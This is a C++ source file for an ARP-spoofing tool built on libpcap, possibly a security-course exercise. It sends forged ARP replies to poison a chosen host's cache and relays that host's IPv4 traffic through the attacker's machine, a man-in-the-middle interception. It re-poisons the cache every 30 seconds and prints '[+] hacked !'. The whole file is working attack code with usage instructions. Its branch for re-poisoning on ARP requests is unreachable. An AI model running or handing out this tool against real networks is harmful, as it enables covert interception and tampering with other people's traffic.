#include <pcap.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <vector>
#include <netinet/ip.h>
#include <ctime>


#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)


struct FlowS {
    Ip senderIp;
    Ip targetIp;
    Mac senderMac;
    Mac targetMac;
};


void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

Mac getMyMac(const char* dev) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    close(s);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Ip getMyIp(const char* dev) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ioctl(s, SIOCGIFADDR, &ifr);
    close(s);
    return Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
}

void sendArpPacket(pcap_t* pcap, Mac ethDmac, Mac ethSmac, uint16_t arpOp,
                   Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = ethDmac;
    packet.eth_.smac_ = ethSmac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(arpOp);
    packet.arp_.smac_ = arpSmac;
    packet.arp_.sip_ = htonl(arpSip);
    packet.arp_.tmac_ = arpTmac;
    packet.arp_.tip_ = htonl(arpTip);

    pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
}

Mac getSenderMac(pcap_t* pcap, Mac myMac, Ip myIp, Ip senderIp) {
    sendArpPacket(pcap, Mac::broadcastMac(), myMac, ArpHdr::Request, myMac, myIp, Mac::nullMac(), senderIp);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* reply;
        int res = pcap_next_ex(pcap, &header, &reply);
        if (res != 1) continue;

        EthArpPacket* recv = (EthArpPacket*)reply;
        if (recv->eth_.type() != EthHdr::Arp) continue;
        if (recv->arp_.op() != ArpHdr::Reply) continue;
        if (recv->arp_.sip() != senderIp) continue;

        return recv->arp_.smac();
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || ((argc - 2) % 2 != 0)) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    Mac myMac = getMyMac(dev);
    Ip myIp = getMyIp(dev);

    std::vector<FlowS> flows;

    for (int i = 2; i < argc; i += 2) {
        FlowS flow;
        flow.senderIp = Ip(argv[i]);
        flow.targetIp = Ip(argv[i + 1]);

        flow.senderMac = getSenderMac(pcap, myMac, myIp, flow.senderIp);
        flow.targetMac = getSenderMac(pcap, myMac, myIp, flow.targetIp);

        flows.push_back(flow);
    }

    for (const auto& flow : flows) {
		sendArpPacket(pcap, flow.senderMac, myMac, ArpHdr::Reply, myMac, flow.targetIp, flow.senderMac, flow.senderIp);
    }
    puts("[+] hacked !");

    time_t last = time(nullptr);

    while (true) {
        time_t now = time(nullptr);

        if (now - last >= 30) {
            for (const auto& flow : flows)
                sendArpPacket(pcap, flow.senderMac, myMac, ArpHdr::Reply, myMac, flow.targetIp, flow.senderMac, flow.senderIp);
            last = now;
        }

        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res != 1) continue;
        if (header->caplen < sizeof(EthHdr)) continue;

        EthHdr* eth = (EthHdr*)packet;
        if (eth->type() != EthHdr::Ip4) continue;
        
        Ip dip(ntohl(*(uint32_t*)(packet + sizeof(EthHdr) + 16)));

        for (const auto& flow : flows) {
            if (eth->smac() != flow.senderMac) continue;
            if (eth->dmac() != myMac) continue;
            if (dip == myIp) continue;
            
            eth->smac_ = myMac;
            eth->dmac_ = flow.targetMac;
            pcap_sendpacket(pcap, packet, header->caplen);
        }
        
        for (const auto& flow : flows) {
            EthArpPacket* recv = (EthArpPacket*)packet;

            if (recv->eth_.type() != EthHdr::Arp) continue;
            if (recv->arp_.op() != ArpHdr::Request) continue;
            if (recv->arp_.sip() != flow.senderIp) continue;

            sendArpPacket(pcap, flow.senderMac, myMac, ArpHdr::Reply, myMac, flow.targetIp, flow.senderMac, flow.senderIp);   
        }
    }

    pcap_close(pcap);
    return 0;
}
